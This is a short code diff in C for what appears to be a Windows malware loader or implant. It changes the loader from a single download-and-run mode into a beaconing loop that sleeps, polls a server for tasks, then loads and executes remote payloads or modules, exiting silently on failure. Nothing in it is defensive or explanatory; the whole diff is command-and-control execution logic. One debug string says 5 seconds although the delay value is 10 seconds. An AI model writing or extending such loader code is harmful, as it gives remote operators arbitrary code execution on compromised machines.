@@ -24,18 +24,47 @@ void LdrMain() {
 
 #ifdef LOAD_AND_EXIT
 	DBGA("[+] Pulling file...\n");
-	LdrInfo loaderInfo = LdrPullFile();
-	if(!loaderInfo.ok) {
+	LdrTask task = LdrPullFile();
+	if(!task.ok) {
 		DBGA("[!] Failed Pulling file\n");
 		LdrExitThread(0);
 	}
 
-	if(!LdrLoadAndRun(loaderInfo, FALSE)) {
+	if(!LdrLoadAndRun(task, FALSE)) {
 		DBGA("[!] Failed Loading file\n");
 		LdrExitThread(0);
 	}
 #else
+	LdrInitPoll();
 	DBGA("[*] Going into poll Loop\n");
+	while(TRUE) {
+		LARGE_INTEGER time;
+		time.QuadPart = -10000LL * 10000LL;
+		DBGA("[*] Sleeping for 5 seconds\n");
+		ldr->win32->NtDelayExecution(FALSE, &time);
+		LdrTask task = LdrPollServer();
+		if(!task.ok) {
+			LdrExitThread(0);
+		}
+
+		switch(task.code) {
+		case TASK_NO_TASK:
+			continue;
+			break;
+		case TASK_LOAD: {
+			if(!LdrLoadAndRun(task, FALSE)) 
+				LdrExitThread(0);
+			break;
+		}
+		case TASK_MODULE: {
+			if(!LdrRunModule(task, FALSE)) 
+				LdrExitThread(0);
+			break;
+		}
+			
+
+		}
+	}
 #endif
 		
 }
